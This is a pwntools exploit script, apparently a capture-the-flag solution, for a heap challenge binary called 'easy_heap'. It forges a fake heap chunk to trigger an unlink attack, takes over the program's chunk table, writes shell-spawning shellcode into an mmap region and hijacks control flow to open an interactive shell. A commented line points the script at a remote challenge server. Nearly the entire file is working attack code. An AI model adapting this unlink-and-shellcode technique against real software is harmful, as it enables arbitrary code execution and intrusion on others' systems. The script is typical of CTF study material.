from pwn import *
context.arch = "amd64"
context.log_level = "debug"
p = process("./easy_heap")  # ,env={"LD_PRELOAD":"./libc.so.6"})
#a = ELF("./easy_heap")
#e = a.libc

#p = remote("132.232.100.67",10004)
# gdb.attach(p)#,"b *0x5555555554a0")


def add(size):
    p.recvuntil(">> ")
    p.sendline("1")
    p.recvuntil("Size: ")
    p.sendline(str(size))


def remove(idx):
    p.recvuntil(">> ")
    p.sendline("2")
    p.recvuntil("Index: ")
    p.sendline(str(idx))


def edit(idx, content):
    p.recvuntil(">> ")
    p.sendline("3")
    p.recvuntil("Index: ")
    p.sendline(str(idx))
    p.recvuntil("Content: ")
    p.sendline(content)


# p.recvuntil("Mmap: ")
# mmap_addr = int(p.recvuntil("\n", drop=True), 16)
# print hex(mmap_addr)
# add(0xf8)
# p.recvuntil("Address 0x")
# addr = int(p.recvline().strip(), 16) - 0x202068
# add(0xf8)
# add(0x20)
# edit(0, p64(0)+p64(0xf1)+p64(addr+0x202068-0x18) +
#      p64(addr+0x202068-0x10)+"a"*0xd0+p64(0xf0))
# remove(1)  # use unlink change chunk list tab ?
# edit(0, p64(0)*2+p64(0xf8)+p64(addr+0x202078) +
#      p64(0x140)+p64(mmap_addr))  # edit chunk tab
# edit(1, asm(shellcraft.sh()))
# bss_addr = 0x202040
# edit(0, p64(addr+0x202090)+p64(0x20)+p64(0x91)+p64(0)*17+p64(0x21)*5)
# remove(1)
# edit(0, p64(0)*3+p64(0x100)+'\x10')
# edit(3, p64(mmap_addr))
# add(0x20)
# p.interactive()

p.recvuntil("Mmap: ")
mmap = int(p.recvuntil("\n"), 16)
print hex(mmap)

add(0xf8)
p.recvuntil(" Address ")
chunkTab = int(p.recvuntil("\n"), 16) - 0x8
print hex(chunkTab)
add(0xf8)
add(0xf8)
fakeChunk = p64(0) + p64(0xf1)
fakeChunk += p64(chunkTab - 0x10) + p64(chunkTab - 0x8)
fakeChunk = fakeChunk.ljust(0xf0, 'a')
fakeChunk += p64(0xf0)
edit(0, fakeChunk)
remove(1)  # control chunk tab
# edit(0,p64(0)*2+p64(0xf8)+p64(mmap)) keep control
shellcode = asm(shellcraft.sh())
edit(
    0,
    p64(0) * 2 + p64(0xf8) + p64(chunkTab - 0x10) + p64(len(shellcode)) +
    p64(mmap))
edit(1, shellcode)  # write shellcode into mmap
edit(0,
     p64(0) * 2 + p64(0xf8) + p64(chunkTab - 0x10) + p64(0xf8) +
     p64(chunkTab + 0x30) + p64(0x20) + p64(0x91) + p64(0) * 17 + p64(0x21) +
     p64(0) * 3 + p64(0x31))  # (p64(0)+p64(0x21)+p64(0)*2)*2
remove(1)
edit(0, p64(0) * 8 + p64(0xff) + '\x10')
edit(3, p64(mmap))
add(0x100)
p.interactive()
p.recv()
